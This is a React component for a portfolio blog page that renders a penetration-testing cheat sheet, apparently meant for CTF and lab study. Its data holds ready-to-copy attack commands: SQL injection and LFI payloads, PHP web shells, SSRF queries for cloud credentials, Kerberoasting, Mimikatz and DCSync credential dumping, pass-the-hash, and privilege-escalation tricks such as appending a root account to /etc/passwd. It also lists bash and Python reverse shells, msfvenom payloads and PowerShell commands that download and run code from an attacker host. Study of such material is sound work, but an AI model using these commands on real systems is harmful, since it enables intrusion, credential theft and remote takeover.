import { useState } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ArrowLeft, Flag, BookOpen, ChevronRight, ChevronDown,
  Search, Globe, Server, Shield, Monitor, Terminal, Package,
  Menu, X, Copy, Check,
} from 'lucide-react';
import './Blog.css';

/* ──────────────────────────────────────────────────────────────────────
   CHEATSHEET DATA
   Each category → sections → { commands[], notes? }
─────────────────────────────────────────────────────────────────────── */
const CHEATSHEET = [
  {
    id: 'enumeration',
    label: 'Enumeration',
    icon: Search,
    color: '#22d3ee',
    sections: [
      {
        id: 'host-discovery',
        label: 'Host Discovery',
        commands: [
          { label: 'Ping sweep (nmap)',           cmd: 'nmap -sn 10.10.10.0/24' },
          { label: 'ARP scan',                    cmd: 'arp-scan -l' },
          { label: 'Netdiscover',                 cmd: 'netdiscover -r 10.10.10.0/24' },
          { label: 'Fping sweep',                 cmd: 'fping -a -g 10.10.10.0/24 2>/dev/null' },
        ],
      },
      {
        id: 'port-scanning',
        label: 'Port Scanning',
        commands: [
          { label: 'Top 1000 ports (default)',     cmd: 'nmap -sC -sV -oN scan.txt <IP>' },
          { label: 'All ports',                    cmd: 'nmap -p- --min-rate 5000 -oN allports.txt <IP>' },
          { label: 'UDP scan (top 100)',           cmd: 'nmap -sU --top-ports 100 -oN udp.txt <IP>' },
          { label: 'OS detection + scripts',       cmd: 'nmap -A -T4 -oN aggressive.txt <IP>' },
          { label: 'Vuln scripts',                 cmd: 'nmap --script vuln -p <ports> <IP>' },
          { label: 'Specific script',              cmd: 'nmap --script=http-title -p 80 <IP>' },
        ],
      },
      {
        id: 'web-enumeration',
        label: 'Web Enumeration',
        commands: [
          { label: 'Gobuster dirs',                cmd: 'gobuster dir -u http://<IP> -w /usr/share/wordlists/dirb/common.txt -x php,html,txt' },
          { label: 'ffuf dirs',                    cmd: 'ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt' },
          { label: 'ffuf vhosts',                  cmd: 'ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://<IP> -H "Host: FUZZ.<domain>" -fs <size>' },
          { label: 'Nikto scan',                   cmd: 'nikto -h http://<IP>' },
          { label: 'Whatweb fingerprint',          cmd: 'whatweb -a 3 http://<IP>' },
          { label: 'WPScan (WordPress)',           cmd: 'wpscan --url http://<IP> --enumerate u,p,t' },
        ],
      },
      {
        id: 'dns-enumeration',
        label: 'DNS Enumeration',
        commands: [
          { label: 'Zone transfer attempt',        cmd: 'dig axfr @<DNS_IP> <domain>' },
          { label: 'Subdomain brute',              cmd: 'gobuster dns -d <domain> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt' },
          { label: 'Reverse lookup',               cmd: 'dig -x <IP> @<DNS>' },
          { label: 'dnsenum',                      cmd: 'dnsenum <domain>' },
          { label: 'All record types',             cmd: 'dig ANY <domain> @<DNS>' },
        ],
      },
    ],
  },
  {
    id: 'common-services',
    label: 'Attacking Common Services',
    icon: Server,
    color: '#a78bfa',
    sections: [
      {
        id: 'ftp',
        label: 'FTP',
        commands: [
          { label: 'Anonymous login check',        cmd: 'ftp <IP>  # user: anonymous  pass: (blank)' },
          { label: 'Nmap FTP scripts',             cmd: 'nmap --script ftp-anon,ftp-brute -p 21 <IP>' },
          { label: 'Download all files',           cmd: 'wget -m ftp://anonymous:@<IP>' },
          { label: 'Brute force',                  cmd: 'hydra -l <user> -P /usr/share/wordlists/rockyou.txt ftp://<IP>' },
        ],
      },
      {
        id: 'smb',
        label: 'SMB',
        commands: [
          { label: 'List shares (no auth)',        cmd: 'smbclient -L //<IP>/ -N' },
          { label: 'Connect to share',             cmd: 'smbclient //<IP>/<share> -U <user>' },
          { label: 'Enum4linux',                   cmd: 'enum4linux -a <IP>' },
          { label: 'CrackMapExec sweep',           cmd: 'crackmapexec smb <IP>/24 -u <user> -p <pass>' },
          { label: 'Nmap SMB scripts',             cmd: 'nmap --script smb-vuln* -p 445 <IP>' },
          { label: 'Download share files',         cmd: 'smbmap -H <IP> -u <user> -p <pass> -R <share> -A "." -q' },
        ],
      },
      {
        id: 'sql-services',
        label: 'SQL Databases',
        commands: [
          { label: 'MSSQL (Impacket)',             cmd: 'mssqlclient.py <domain>/<user>:<pass>@<IP> -windows-auth' },
          { label: 'MSSQL list databases',         cmd: "SELECT name FROM sys.databases;" },
          { label: 'MSSQL xp_cmdshell',           cmd: "EXEC xp_cmdshell 'whoami';" },
          { label: 'MySQL connect',                cmd: 'mysql -u <user> -p<pass> -h <IP>' },
          { label: 'MySQL show tables',            cmd: "SHOW DATABASES; USE <db>; SHOW TABLES;" },
          { label: 'Nmap MySQL enum',              cmd: 'nmap --script mysql-info,mysql-databases -p 3306 <IP>' },
        ],
      },
      {
        id: 'rdp-winrm',
        label: 'RDP / WinRM',
        commands: [
          { label: 'xfreerdp connect',             cmd: 'xfreerdp /u:<user> /p:<pass> /v:<IP> /dynamic-resolution' },
          { label: 'Evil-WinRM shell',             cmd: 'evil-winrm -i <IP> -u <user> -p <pass>' },
          { label: 'Evil-WinRM with hash',         cmd: 'evil-winrm -i <IP> -u <user> -H <NTLM_hash>' },
          { label: 'Nmap RDP scripts',             cmd: 'nmap --script rdp-vuln-ms12-020 -p 3389 <IP>' },
        ],
      },
      {
        id: 'ssh',
        label: 'SSH',
        commands: [
          { label: 'SSH with key',                 cmd: 'ssh -i id_rsa <user>@<IP>' },
          { label: 'Fix key permissions',          cmd: 'chmod 600 id_rsa' },
          { label: 'Brute force',                  cmd: 'hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>' },
          { label: 'SSH tunneling (local)',        cmd: 'ssh -L <local_port>:127.0.0.1:<remote_port> <user>@<IP>' },
          { label: 'Enumerate SSH version',        cmd: 'nmap -sV -p 22 <IP>' },
        ],
      },
    ],
  },
  {
    id: 'web-attacks',
    label: 'Web Attacks',
    icon: Globe,
    color: '#f87171',
    sections: [
      {
        id: 'sqli',
        label: 'SQL Injection',
        commands: [
          { label: 'SQLmap basic',                 cmd: "sqlmap -u 'http://<IP>/page?id=1' --dbs" },
          { label: 'SQLmap with cookie',           cmd: "sqlmap -u 'http://<IP>/page' --cookie='session=<val>' --dbs --dump" },
          { label: 'SQLmap via POST',              cmd: "sqlmap -u 'http://<IP>/login' --data='user=a&pass=b' --dbs" },
          { label: 'Auth bypass (login)',          cmd: "' OR '1'='1' --" },
          { label: 'UNION column count',          cmd: "' ORDER BY 1-- -  # increment until error" },
          { label: 'UNION data exfil',            cmd: "' UNION SELECT 1,username,password FROM users-- -" },
        ],
      },
      {
        id: 'file-inclusion',
        label: 'File Inclusion (LFI/RFI)',
        commands: [
          { label: 'Basic LFI',                   cmd: '?page=../../../../etc/passwd' },
          { label: 'Null byte (older PHP)',        cmd: '?page=../../../../etc/passwd%00' },
          { label: '/proc/self/environ',           cmd: '?page=../../../../proc/self/environ' },
          { label: 'Log poisoning via User-Agent', cmd: 'curl -A "<?php system($_GET[\'cmd\']); ?>" http://<IP>/\n?page=../../../../var/log/apache2/access.log&cmd=whoami' },
          { label: 'PHP filter base64',           cmd: '?page=php://filter/convert.base64-encode/resource=index.php' },
          { label: 'RFI (if allow_url_include)',  cmd: '?page=http://<attacker>/shell.txt' },
        ],
      },
      {
        id: 'command-injection',
        label: 'Command Injection',
        commands: [
          { label: 'Basic separators',            cmd: '; whoami  |  whoami  && whoami  || whoami' },
          { label: 'Blind - ping callback',       cmd: '; ping -c 1 <attacker_IP>' },
          { label: 'Blind - DNS callback',        cmd: '; nslookup <attacker_burp>' },
          { label: 'Filter bypass (space)',       cmd: '${IFS}  # replaces space' },
          { label: 'Filter bypass (slash)',       cmd: '${PATH:0:1}  # = /' },
          { label: 'Commix auto exploit',        cmd: 'commix --url="http://<IP>/page?param=INJECT_HERE"' },
        ],
      },
      {
        id: 'file-upload',
        label: 'File Upload Bypass',
        commands: [
          { label: 'Double extension',            cmd: 'shell.php.jpg' },
          { label: 'Magic bytes (add GIF header)',cmd: 'GIF89a;  <?php system($_GET["cmd"]); ?>' },
          { label: 'Change Content-Type',         cmd: 'Content-Type: image/jpeg  (keep .php extension)' },
          { label: 'Null byte filename',          cmd: 'shell.php%00.jpg' },
          { label: 'Case variation',              cmd: 'shell.PhP  /  shell.pHp' },
        ],
      },
      {
        id: 'ssrf',
        label: 'SSRF',
        commands: [
          { label: 'Internal port scan',          cmd: 'url=http://127.0.0.1:PORT/' },
          { label: 'Cloud metadata (AWS)',        cmd: 'url=http://169.254.169.254/latest/meta-data/iam/security-credentials/' },
          { label: 'Filter bypass (@)',           cmd: 'url=http://attacker@127.0.0.1/' },
          { label: 'Filter bypass (decimal IP)', cmd: 'url=http://2130706433/  # = 127.0.0.1' },
          { label: 'Gopher protocol',            cmd: 'url=gopher://127.0.0.1:6379/_PING' },
        ],
      },
    ],
  },
  {
    id: 'active-directory',
    label: 'Active Directory',
    icon: Shield,
    color: '#fbbf24',
    sections: [
      {
        id: 'ad-enum',
        label: 'AD Enumeration',
        commands: [
          { label: 'BloodHound Python ingest',   cmd: 'bloodhound-python -u <user> -p <pass> -d <domain> -ns <DC_IP> -c all' },
          { label: 'PowerView - domain info',    cmd: 'Get-Domain  /  Get-DomainController' },
          { label: 'PowerView - users',          cmd: 'Get-DomainUser | select cn,description,memberof' },
          { label: 'PowerView - computers',      cmd: 'Get-DomainComputer -Properties dnsHostName | sort -Property dnsHostName' },
          { label: 'LDAP anonymous enum',        cmd: 'ldapsearch -H ldap://<DC_IP> -x -s base -b "" "(objectClass=*)"' },
          { label: 'CrackMapExec users',         cmd: 'crackmapexec smb <DC_IP> -u <user> -p <pass> --users' },
        ],
      },
      {
        id: 'kerberoasting',
        label: 'Kerberoasting',
        commands: [
          { label: 'Impacket GetUserSPNs',       cmd: 'GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <DC_IP> -request' },
          { label: 'Rubeus (from Windows)',       cmd: 'Rubeus.exe kerberoast /format:hashcat /outfile:hashes.txt' },
          { label: 'Crack with hashcat',          cmd: 'hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt' },
        ],
      },
      {
        id: 'asrep-roasting',
        label: 'AS-REP Roasting',
        commands: [
          { label: 'Find accounts (no preauth)', cmd: 'Get-DomainUser -PreauthNotRequired | select samaccountname' },
          { label: 'Impacket GetNPUsers',        cmd: 'GetNPUsers.py <domain>/ -usersfile users.txt -dc-ip <DC_IP> -no-pass -format hashcat' },
          { label: 'Crack with hashcat',         cmd: 'hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt' },
        ],
      },
      {
        id: 'lateral-movement',
        label: 'Lateral Movement',
        commands: [
          { label: 'Pass the Hash (CME)',        cmd: 'crackmapexec smb <IP> -u <user> -H <NTLM> --local-auth' },
          { label: 'Pass the Hash (WinRM)',      cmd: 'evil-winrm -i <IP> -u <user> -H <NTLM>' },
          { label: 'Pass the Ticket (Mimikatz)', cmd: 'sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<hash> /run:cmd.exe' },
          { label: 'Over-Pass the Hash (Rubeus)',cmd: 'Rubeus.exe asktgt /user:<user> /rc4:<hash> /ptt' },
          { label: 'Impacket PSExec',            cmd: 'psexec.py <domain>/<user>:<pass>@<IP>' },
          { label: 'WMI exec',                   cmd: 'wmiexec.py <domain>/<user>:<pass>@<IP>' },
        ],
      },
      {
        id: 'dcsync',
        label: 'DCSync & Dumping',
        commands: [
          { label: 'Secretsdump (Impacket)',     cmd: 'secretsdump.py <domain>/<user>:<pass>@<DC_IP>' },
          { label: 'Mimikatz DCSync',            cmd: 'lsadump::dcsync /user:<domain>\\Administrator' },
          { label: 'Dump SAM remotely',          cmd: 'secretsdump.py -sam sam.bak -system system.bak LOCAL' },
          { label: 'Mimikatz dump memory',       cmd: 'sekurlsa::logonpasswords' },
        ],
      },
    ],
  },
  {
    id: 'linux-privesc',
    label: 'Linux Privilege Escalation',
    icon: Terminal,
    color: '#4ade80',
    sections: [
      {
        id: 'linux-enum',
        label: 'Enumeration',
        commands: [
          { label: 'LinPEAS (auto enum)',         cmd: 'curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh' },
          { label: 'Sudo permissions',           cmd: 'sudo -l' },
          { label: 'SUID binaries',              cmd: 'find / -perm -u=s -type f 2>/dev/null' },
          { label: 'World-writable files',       cmd: 'find / -writable -type f 2>/dev/null | grep -v proc' },
          { label: 'Cron jobs',                  cmd: 'cat /etc/crontab && ls -la /etc/cron*' },
          { label: 'Capabilities',               cmd: 'getcap -r / 2>/dev/null' },
          { label: 'NFS shares',                 cmd: 'cat /etc/exports' },
          { label: 'OS / kernel version',        cmd: 'uname -a && cat /etc/os-release' },
        ],
      },
      {
        id: 'sudo-exploits',
        label: 'Sudo Misconfigurations',
        commands: [
          { label: 'Check sudo rules',           cmd: 'sudo -l' },
          { label: 'GTFOBins lookup',            cmd: '# https://gtfobins.github.io — search the binary' },
          { label: 'LD_PRELOAD (if allowed)',    cmd: 'echo \'#include<stdio.h>\\nvoid _init(){setuid(0);system("/bin/bash");}\\n\' > /tmp/pe.c && gcc -shared -fPIC -nostartfiles -o /tmp/pe.so /tmp/pe.c && sudo LD_PRELOAD=/tmp/pe.so <cmd>' },
          { label: 'Python sudo shell',         cmd: 'sudo python3 -c "import pty;pty.spawn(\'/bin/bash\')"' },
          { label: 'Vim sudo shell',            cmd: 'sudo vim -c ":!bash"' },
          { label: 'Find sudo shell',           cmd: 'sudo find / -exec /bin/bash \\;' },
        ],
      },
      {
        id: 'suid-exploits',
        label: 'SUID Binaries',
        commands: [
          { label: 'Find SUID files',            cmd: 'find / -perm -u=s -type f 2>/dev/null' },
          { label: 'Bash SUID',                  cmd: '/bin/bash -p' },
          { label: 'Python SUID',                cmd: 'python3 -c "import os; os.execl(\'/bin/bash\', \'bash\', \'-p\')"' },
          { label: 'cp SUID (overwrite passwd)', cmd: 'cp /etc/passwd /tmp/passwd.bak && echo "root2::0:0::/root:/bin/bash" >> /etc/passwd && su root2' },
          { label: 'GTFOBins',                   cmd: '# https://gtfobins.github.io/#?function=suid' },
        ],
      },
      {
        id: 'cron-jobs',
        label: 'Cron Jobs',
        commands: [
          { label: 'View system crons',          cmd: 'cat /etc/crontab && cat /etc/cron.d/*' },
          { label: 'Monitor with pspy',          cmd: './pspy64  # watch processes without root' },
          { label: 'Writable script exploit',    cmd: 'echo "chmod +s /bin/bash" >> /path/to/cron_script.sh && /bin/bash -p' },
          { label: 'PATH hijack via cron',       cmd: 'echo "chmod +s /bin/bash" > /tmp/<script_name> && chmod +x /tmp/<script_name>' },
        ],
      },
    ],
  },
  {
    id: 'windows-privesc',
    label: 'Windows Privilege Escalation',
    icon: Monitor,
    color: '#60a5fa',
    sections: [
      {
        id: 'win-enum',
        label: 'Enumeration',
        commands: [
          { label: 'WinPEAS',                    cmd: '.\\winPEASx64.exe' },
          { label: 'Whoami + privs',             cmd: 'whoami /all' },
          { label: 'Local users & groups',       cmd: 'net user && net localgroup administrators' },
          { label: 'Installed software',         cmd: 'wmic product get name,version' },
          { label: 'Running services',           cmd: 'sc query state=all' },
          { label: 'Scheduled tasks',            cmd: 'schtasks /query /fo LIST /v' },
          { label: 'AlwaysInstallElevated',      cmd: 'reg query HKCU\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated' },
        ],
      },
      {
        id: 'token-impersonation',
        label: 'Token Impersonation',
        commands: [
          { label: 'Check SeImpersonatePrivilege',cmd: 'whoami /priv' },
          { label: 'PrintSpoofer',               cmd: '.\\PrintSpoofer.exe -i -c cmd' },
          { label: 'GodPotato',                  cmd: '.\\GodPotato.exe -cmd "cmd /c whoami"' },
          { label: 'JuicyPotato',                cmd: '.\\JuicyPotato.exe -l 1337 -p cmd.exe -t *' },
          { label: 'RoguePotato',                cmd: '.\\RoguePotato.exe -r <attacker_IP> -e "cmd.exe"' },
        ],
      },
      {
        id: 'service-exploits',
        label: 'Weak Service Permissions',
        commands: [
          { label: 'AccessChk service perms',    cmd: '.\\accesschk.exe -ucqv <service> -accepteula' },
          { label: 'Unquoted service path',      cmd: 'wmic service get name,pathname | findstr /i /v "C:\\\\Windows" | findstr /i /v """' },
          { label: 'Writable service binary',    cmd: '.\\accesschk.exe -uwcqv "Everyone" * /accepteula 2>nul' },
          { label: 'Replace service binary',     cmd: 'copy /y shell.exe "C:\\path\\to\\service.exe" && sc start <service>' },
          { label: 'PowerUp all checks',         cmd: 'powershell -ep bypass -c "Import-Module .\\PowerUp.ps1; Invoke-AllChecks"' },
        ],
      },
    ],
  },
  {
    id: 'post-exploitation',
    label: 'Post-Exploitation',
    icon: Package,
    color: '#fb923c',
    sections: [
      {
        id: 'shells-payloads',
        label: 'Shells & Payloads',
        commands: [
          { label: 'Netcat listener',            cmd: 'nc -lvnp 4444' },
          { label: 'Bash reverse shell',         cmd: 'bash -i >& /dev/tcp/<IP>/4444 0>&1' },
          { label: 'Python3 reverse shell',      cmd: 'python3 -c \'import socket,subprocess,os;s=socket.socket();s.connect(("<IP>",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'' },
          { label: 'msfvenom Linux ELF',        cmd: 'msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f elf -o shell.elf' },
          { label: 'msfvenom Windows EXE',      cmd: 'msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=4444 -f exe -o shell.exe' },
          { label: 'Upgrade to stable TTY',     cmd: 'python3 -c "import pty;pty.spawn(\'/bin/bash\')" && (ctrl+z) && stty raw -echo; fg && export TERM=xterm' },
        ],
      },
      {
        id: 'file-transfers',
        label: 'File Transfers',
        commands: [
          { label: 'Python HTTP server',         cmd: 'python3 -m http.server 8080' },
          { label: 'wget download',              cmd: 'wget http://<IP>:8080/file -O /tmp/file' },
          { label: 'curl download',              cmd: 'curl http://<IP>:8080/file -o /tmp/file' },
          { label: 'PowerShell download',        cmd: "IEX(New-Object Net.WebClient).DownloadString('http://<IP>/shell.ps1')" },
          { label: 'SMB server (Impacket)',      cmd: 'smbserver.py share . -smb2support -u user -p pass' },
          { label: 'SCP upload',                 cmd: 'scp file <user>@<IP>:/tmp/' },
          { label: 'Certutil (Windows)',         cmd: 'certutil -urlcache -split -f http://<IP>/shell.exe shell.exe' },
        ],
      },
      {
        id: 'password-attacks',
        label: 'Password Attacks',
        commands: [
          { label: 'Identify hash',              cmd: 'hash-identifier <hash>  # or: hashid -m <hash>' },
          { label: 'Hashcat MD5',                cmd: 'hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt' },
          { label: 'Hashcat NTLM',               cmd: 'hashcat -m 1000 hash.txt /usr/share/wordlists/rockyou.txt' },
          { label: 'Hashcat NetNTLMv2',          cmd: 'hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt' },
          { label: 'John the Ripper',            cmd: 'john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
          { label: 'Hydra SSH',                  cmd: 'hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://<IP>' },
          { label: 'Hydra HTTP POST',            cmd: 'hydra -l admin -P rockyou.txt <IP> http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"' },
        ],
      },
      {
        id: 'pivoting',
        label: 'Pivoting & Tunneling',
        commands: [
          { label: 'SSH local port forward',     cmd: 'ssh -L <local_port>:<target_IP>:<target_port> <user>@<pivot_IP>' },
          { label: 'SSH dynamic (SOCKS)',        cmd: 'ssh -D 9050 <user>@<pivot_IP>  # then use proxychains' },
          { label: 'Proxychains config',         cmd: 'echo "socks5 127.0.0.1 9050" >> /etc/proxychains.conf' },
          { label: 'Chisel server',              cmd: './chisel server -p 8000 --reverse' },
          { label: 'Chisel client tunnel',       cmd: './chisel client <attacker_IP>:8000 R:socks' },
          { label: 'Ligolo-ng agent',            cmd: './agent -connect <attacker_IP>:11601 -ignore-cert' },
        ],
      },
    ],
  },
];

/* ──────────────────────────────────────────────────────────────────────
   COPY BUTTON
─────────────────────────────────────────────────────────────────────── */
function CopyButton({ text }) {
  const [copied, setCopied] = useState(false);
  function copy() {
    navigator.clipboard.writeText(text).then(() => {
      setCopied(true);
      setTimeout(() => setCopied(false), 1800);
    });
  }
  return (
    <button className="cheat__copy-btn" onClick={copy} title="Copy command">
      {copied ? <Check size={12} /> : <Copy size={12} />}
    </button>
  );
}

/* ──────────────────────────────────────────────────────────────────────
   SIDEBAR
─────────────────────────────────────────────────────────────────────── */
function Sidebar({ selected, onSelect, open, onClose }) {
  const [expanded, setExpanded] = useState(() => {
    const init = {};
    CHEATSHEET.forEach(c => { init[c.id] = c.sections.some(s => s.id === selected?.sectionId); });
    if (CHEATSHEET[0]) init[CHEATSHEET[0].id] = true;
    return init;
  });

  function toggleCat(id) {
    setExpanded(e => ({ ...e, [id]: !e[id] }));
  }

  return (
    <>
      {open && <div className="cheat__overlay" onClick={onClose} />}
      <aside className={`cheat__sidebar ${open ? 'cheat__sidebar--open' : ''}`}>
        <div className="cheat__sidebar-inner">
          {CHEATSHEET.map(cat => {
            const Icon = cat.icon;
            const isExpanded = expanded[cat.id];
            return (
              <div key={cat.id} className="cheat__cat">
                <button
                  className="cheat__cat-btn"
                  onClick={() => toggleCat(cat.id)}
                  style={{ '--cc': cat.color }}
                >
                  <span className="cheat__cat-btn-left">
                    <Icon size={13} />
                    {cat.label}
                  </span>
                  <ChevronDown
                    size={13}
                    className={`cheat__chevron ${isExpanded ? 'cheat__chevron--open' : ''}`}
                  />
                </button>

                <AnimatePresence initial={false}>
                  {isExpanded && (
                    <motion.ul
                      className="cheat__section-list"
                      initial={{ height: 0, opacity: 0 }}
                      animate={{ height: 'auto', opacity: 1, transition: { duration: 0.22 } }}
                      exit={{ height: 0, opacity: 0, transition: { duration: 0.18 } }}
                    >
                      {cat.sections.map(sec => {
                        const active = selected?.catId === cat.id && selected?.sectionId === sec.id;
                        return (
                          <li key={sec.id}>
                            <button
                              className={`cheat__section-btn ${active ? 'cheat__section-btn--active' : ''}`}
                              style={{ '--cc': cat.color }}
                              onClick={() => { onSelect({ catId: cat.id, sectionId: sec.id }); onClose(); }}
                            >
                              <ChevronRight size={11} className="cheat__section-arrow" />
                              {sec.label}
                            </button>
                          </li>
                        );
                      })}
                    </motion.ul>
                  )}
                </AnimatePresence>
              </div>
            );
          })}
        </div>
      </aside>
    </>
  );
}

/* ──────────────────────────────────────────────────────────────────────
   CONTENT PANEL
─────────────────────────────────────────────────────────────────────── */
function ContentPanel({ selected }) {
  if (!selected) return null;
  const cat = CHEATSHEET.find(c => c.id === selected.catId);
  const sec = cat?.sections.find(s => s.id === selected.sectionId);
  if (!cat || !sec) return null;

  return (
    <motion.div
      key={selected.catId + selected.sectionId}
      className="cheat__content"
      initial={{ opacity: 0, y: 12 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.3, ease: 'easeOut' }}
    >
      <div className="cheat__breadcrumb">
        <span style={{ color: cat.color }}>{cat.label}</span>
        <ChevronRight size={12} />
        <span>{sec.label}</span>
      </div>

      <h2 className="cheat__section-title" style={{ '--cc': cat.color }}>{sec.label}</h2>

      <div className="cheat__commands">
        {sec.commands.map((entry, i) => (
          <div key={i} className="cheat__cmd-row">
            <span className="cheat__cmd-label">{entry.label}</span>
            <div className="cheat__cmd-block">
              <code className="cheat__cmd-code">{entry.cmd}</code>
              <CopyButton text={entry.cmd} />
            </div>
          </div>
        ))}
      </div>
    </motion.div>
  );
}

/* ──────────────────────────────────────────────────────────────────────
   BLOG PAGE
─────────────────────────────────────────────────────────────────────── */
const DEFAULT_SEL = { catId: CHEATSHEET[0].id, sectionId: CHEATSHEET[0].sections[0].id };

export default function Blog() {
  const [tab, setTab]           = useState('cheatsheet');
  const [selected, setSelected] = useState(DEFAULT_SEL);
  const [sidebarOpen, setSidebarOpen] = useState(false);

  return (
    <div className="blog">
      <div className="grid-bg" />

      {/* ── Top bar ─────────────────────────── */}
      <header className="blog__topbar">
        <a href="/" className="blog__back">
          <ArrowLeft size={15} /> Portfolio
        </a>
        <div className="blog__topbar-center">
          <span className="blog__logo-bracket">&lt;</span>
          Blog
          <span className="blog__logo-bracket"> /&gt;</span>
        </div>
        <div />
      </header>

      {/* ── Tabs ────────────────────────────── */}
      <div className="blog__tabs">
        <button
          className={`blog__tab ${tab === 'writeups' ? 'blog__tab--active' : ''}`}
          onClick={() => setTab('writeups')}
        >
          <Flag size={14} /> CTF Writeups
        </button>
        <button
          className={`blog__tab ${tab === 'cheatsheet' ? 'blog__tab--active' : ''}`}
          onClick={() => setTab('cheatsheet')}
        >
          <BookOpen size={14} /> Pentest Cheatsheet
        </button>
      </div>

      {/* ── Content ─────────────────────────── */}
      <AnimatePresence mode="wait">
        {tab === 'writeups' && (
          <motion.div
            key="writeups"
            className="blog__coming-soon"
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          >
            <span className="blog__cs-tag">// coming soon</span>
            <h2 className="blog__cs-title">CTF Writeups</h2>
            <p className="blog__cs-sub">Lab walkthroughs and machine writeups will be published here.</p>
          </motion.div>
        )}

        {tab === 'cheatsheet' && (
          <motion.div
            key="cheatsheet"
            className="cheat__layout"
            initial={{ opacity: 0 }} animate={{ opacity: 1 }} exit={{ opacity: 0 }}
          >
            {/* mobile sidebar toggle */}
            <button className="cheat__menu-btn" onClick={() => setSidebarOpen(true)}>
              <Menu size={18} /> Menu
            </button>

            <Sidebar
              selected={selected}
              onSelect={setSelected}
              open={sidebarOpen}
              onClose={() => setSidebarOpen(false)}
            />

            <ContentPanel selected={selected} />
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
}
